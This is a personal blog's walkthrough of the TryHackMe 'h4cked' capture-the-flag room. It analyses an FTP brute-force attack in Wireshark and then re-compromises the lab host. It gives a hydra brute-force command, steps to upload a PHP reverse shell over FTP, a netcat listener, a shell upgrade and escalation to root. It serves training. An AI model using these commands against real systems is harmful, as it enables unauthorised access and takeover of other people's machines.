<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="h4cked h4cked is an easy difficulty room on TryHackMe. Below are the steps I followed to answer the questions for this box.
Hints Task 1 Hints Have you reviewed the packet capture to see what's going on? Look for some commonly used services to find which one is being brute forced by the attacker. Reviewing TCP streams will provide great insight into answering most of these questions. Task 2 Hints Use hydra to brute force the password for the service identified in Task 1."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="h4cked"><meta name=twitter:description content="h4cked h4cked is an easy difficulty room on TryHackMe. Below are the steps I followed to answer the questions for this box.
Hints Task 1 Hints Have you reviewed the packet capture to see what's going on? Look for some commonly used services to find which one is being brute forced by the attacker. Reviewing TCP streams will provide great insight into answering most of these questions. Task 2 Hints Use hydra to brute force the password for the service identified in Task 1."><meta property="og:title" content="h4cked"><meta property="og:description" content="h4cked h4cked is an easy difficulty room on TryHackMe. Below are the steps I followed to answer the questions for this box.
Hints Task 1 Hints Have you reviewed the packet capture to see what's going on? Look for some commonly used services to find which one is being brute forced by the attacker. Reviewing TCP streams will provide great insight into answering most of these questions. Task 2 Hints Use hydra to brute force the password for the service identified in Task 1."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2021-03-20-h4cked/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2021-03-20T00:00:00+00:00"><meta property="article:modified_time" content="2021-03-20T00:00:00+00:00"><title>h4cked · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2021-03-20-h4cked/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.3be366585a98f2fd37ebeea71b40bbe125880d4f9ab6d54e7c383ff0e1d19d66.css integrity="sha256-O+NmWFqY8v036+6nG0C74SWIDU+attVOfDg/8OHRnWY=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.815859ce402d78e4e2074b80305c3b86578d026ab3055642afc27e110e03fac2.css integrity="sha256-gVhZzkAteOTiB0uAMFw7hleNAmqzBVZCr8J+EQ4D+sI=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.111.1"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2021-03-20-h4cked/>h4cked</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2021-03-20T00:00:00Z>March 20, 2021</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
4-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/hydra/>hydra</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/reverse-shell/>reverse shell</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/wireshark/>Wireshark</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/packet-analysis/>packet analysis</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/rootkit/>rootkit</a></span></div></div></header><div><h1 id=h4cked>h4cked
<a class=heading-link href=#h4cked><i class="fa fa-link" aria-hidden=true></i></a></h1><p>h4cked is an easy difficulty room on TryHackMe. Below are the steps I followed to answer the questions for this box.</p><h2 id=hints>Hints
<a class=heading-link href=#hints><i class="fa fa-link" aria-hidden=true></i></a></h2><details><summary><strong>Task 1 Hints</strong></summary><ul><li>Have you reviewed the packet capture to see what's going on?<li>Look for some commonly used services to find which one is being brute forced by the attacker.<li>Reviewing TCP streams will provide great insight into answering most of these questions.</ul></details><details><summary><strong>Task 2 Hints</strong></summary><ul><li>Use hydra to brute force the password for the service identified in Task 1.<li>Don't forget to start a listener on your attacker box.<li>What command can you use to gain elevated privileges once logged in?</ul></details><h2 id=walkthrough>Walkthrough
<a class=heading-link href=#walkthrough><i class="fa fa-link" aria-hidden=true></i></a></h2><details><summary><strong>Full Walkthrough</strong></summary><h3 id=task-1>Task 1
<a class=heading-link href=#task-1><i class="fa fa-link" aria-hidden=true></i></a></h3><h4 id=question-1>Question 1
<a class=heading-link href=#question-1><i class="fa fa-link" aria-hidden=true></i></a></h4><p><img src=/assets/img/h4cked1.png alt="h4cked question 1"></p><p>After downloading the pcapng file, open it up in Wireshark and then click on <strong>Statistics</strong> followed by <strong>Protocol Hierarchy</strong>. This will show you all the protocols utilized in this packet capture as shown below.</p><p><img src=/assets/img/h4cked2.png alt="h4cked Wireshark protocols"></p><p>Based on this, there are two protocols utilized, HTTP and FTP. Let&rsquo;s close this window and in the filter toolbar, enter the following:</p><p><strong><code>ftp</code></strong></p><p><img src=/assets/img/h4cked3.png alt="h4cked Wireshark ftp filter"></p><p>Next, right click on packet 49 (the first filtered packet) and select <strong>Follow</strong> and then <strong>TCP Stream</strong></p><p><img src=/assets/img/h4cked4.png alt="h4cked Wireshark follow TCP stream"></p><p>The window that pops up shows you that this service has attempts to login to it as shown below, so <strong>FTP</strong> is the answer to Question 1.</p><p><img src=/assets/img/h4cked5.png alt="h4cked ftp TCP stream"></p><h4 id=question-2>Question 2
<a class=heading-link href=#question-2><i class="fa fa-link" aria-hidden=true></i></a></h4><p>This question asks you about a popular brute forcing tool.</p><p><img src=/assets/img/h4cked6.png alt="h4cked Question 2"></p><p>A quick Google search for <strong>Van Hauser brute force tool</strong> will reveal the answer of <strong>hydra</strong></p><p><img src=/assets/img/h4cked7.png alt="h4cked Google van hauser brute force tool"></p><h4 id=questions-3-and-4>Questions 3 and 4
<a class=heading-link href=#questions-3-and-4><i class="fa fa-link" aria-hidden=true></i></a></h4><p><img src=/assets/img/h4cked8.png alt="h4cked Questions 3 and 4"></p><p>These can be found by following the steps in Question 1. Filtering Wireshark by ftp and then following the first TCP stream. This results in a username of <strong>jenny</strong> and a password of <strong>password123</strong>.</p><p><img src=/assets/img/h4cked9.png alt="h4cked Wireshark Questions 3 and 4"></p><h4 id=questions-5-and-6>Questions 5 and 6
<a class=heading-link href=#questions-5-and-6><i class="fa fa-link" aria-hidden=true></i></a></h4><p><img src=/assets/img/h4cked10.png alt="h4cked Questions 5 and 6"></p><p>In Wireshark, add the following as your filter:</p><p><strong><code>ftp contains "PWD"</code></strong></p><p>This filters out commands to only show FTP protocols that are running the PWD (print working directory) command.</p><p><img src=/assets/img/h4cked11.png alt="h4cked Wireshark ftp PWD"></p><p>Follow the TCP stream (as you did for prior questions) and you will see the server&rsquo;s response to the PWD request, which is the answer to question 5. Further in this TCP is the answer to Question 6 as well.</p><p><img src=/assets/img/h4cked12.png alt="h4cked Wireshark ftp PWD TCP Stream"></p><h4 id=question-7>Question 7
<a class=heading-link href=#question-7><i class="fa fa-link" aria-hidden=true></i></a></h4><p><img src=/assets/img/h4cked13.png alt="h4cked Question 7"></p><p>Let&rsquo;s turn our focus to the ftp-data protocol in Wireshark and enter the following filter:</p><p><strong><code>ftp-data"</code></strong></p><p><img src=/assets/img/h4cked14.png alt="h4cked Wireshark ftp-data"></p><p>As we have done previously, Follow the TCP dream for the 2nd packet listed (431).</p><p><img src=/assets/img/h4cked15.png alt="h4cked shell.php URL"></p><h4 id=questions-8---13>Questions 8 - 13
<a class=heading-link href=#questions-8---13><i class="fa fa-link" aria-hidden=true></i></a></h4><p><img src=/assets/img/h4cked16.png alt="h4cked Questions 8-13"></p><p>For these questions you can filter with the following in Wireshark:</p><p><strong><code>frame contains "whoami"</code></strong></p><p>I assumed whoami was the command used as it&rsquo;s one of the first commands ran to gather information once a foothold has been established.</p><p><img src=/assets/img/h4cked17.png alt="h4cked Wireshark frame filter"></p><p>Once filtered, you can do another Follow TCP Stream to get answers to Questions 8 -13:</p><p><strong>Question 8</strong></p><p><img src=/assets/img/h4cked18.png alt="h4cked Question 8 answer"></p><p><strong>Question 9</strong></p><p><img src=/assets/img/h4cked19.png alt="h4cked Question 9 answer"></p><p><strong>Question 10</strong></p><p><img src=/assets/img/h4cked20.png alt="h4cked Question 10 answer"></p><p><strong>Question 11</strong></p><p><img src=/assets/img/h4cked21.png alt="h4cked Question 11 answer"></p><p><strong>Question 12</strong></p><p><img src=/assets/img/h4cked22.png alt="h4cked Question 12 answer"></p><p><strong>Question 13</strong></p><p>This one is somewhat general knowledge, but a quick Google search will likely get your answer. The answer is <strong>rootkit</strong>.</p><h3 id=task-2>Task 2
<a class=heading-link href=#task-2><i class="fa fa-link" aria-hidden=true></i></a></h3><p>There is only one question that needs an answer, which is reading the flag.txt file. Here are the steps to follow to root this host. First, let&rsquo;s run hydra on the jenny user with the following command on our attacker host.</p><p><strong><code>hydra -t 10 -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.237.6 ftp</code></strong></p><p>Where 10.10.237.6 is the victim host&rsquo;s IP address. After a few minutes you will uncover the new password for jenny.</p><p><img src=/assets/img/h4cked23.png alt="h4cked hydra"></p><p>Great, now we know the FTP password for jenny. Let&rsquo;s download the reverse PHP shell located <a href=https://github.com/pentestmonkey/php-reverse-shell>here</a>. Save the file as <strong>shell.php</strong> in your user&rsquo;s home folder.</p><p><img src=/assets/img/h4cked24.png alt="h4cked reverse shell modification"></p><p>Next, let&rsquo;s ftp as the jenny user over to our victim host from our attacker host using the password we uncovered. To initially connect, run:</p><p><strong><code>ftp &lt;victim ip></code></strong></p><p><img src=/assets/img/h4cked25.png alt="h4cked ftp connection"></p><p>Next let&rsquo;s run:</p><p><strong><code>bin</code></strong></p><p>and</p><p><strong><code>put shell.php</code></strong></p><p>to change the mode to binary mode and upload the shell.</p><p><img src=/assets/img/h4cked26.png alt="h4cked upload reverse shell"></p><p>On your attacker host, run the following to open up a listener to catch the reverse shell:</p><p><strong><code>nc -nvlp 4444</code></strong></p><p><img src=/assets/img/h4cked27.png alt="h4cked nc listener"></p><p>Next, navigate to <strong>http://&lt;attacker ip>/shell.php</strong> and you should see a connection to your netcat listener.</p><p><img src=/assets/img/h4cked28.png alt="h4cked reverse shell connection"></p><p>Next, let&rsquo;s get a fully interactive shell with the following python command:</p><p><strong><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></strong></p><p><img src=/assets/img/h4cked29.png alt="h4cked upgrade shell"></p><p>You will notice we are running as the www-data user. Let&rsquo;s run:</p><p><strong><code>su jenny</code></strong> to switch over to the jenny user and enter the password we uncovered earlier.</p><p><img src=/assets/img/h4cked30.png alt="h4cked su jenny"></p><p>Next, let&rsquo;s run the following to change our privileges to root:</p><p><strong><code>sudo su</code></strong></p><p><img src=/assets/img/h4cked31.png alt="h4cked su root"></p><p>Next, run the following commands to change to the root user&rsquo;s home directory, list that directory&rsquo;s contents, navigate to the Reptile subdirectory, list that directory&rsquo;s contents, and then display the flag.txt file.</p><p><strong><code>cd /root</code></strong></p><p><strong><code>ls -al</code></strong></p><p><strong><code>cd Reptile</code></strong></p><p><strong><code>ls -al</code></strong></p><p><strong><code>cat flag.txt</code></strong></p><p><img src=/assets/img/h4cked32.png alt="h4cked root.txt"></p><p>And that is the end of this box! It has been fully compromised (again).</p></details></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>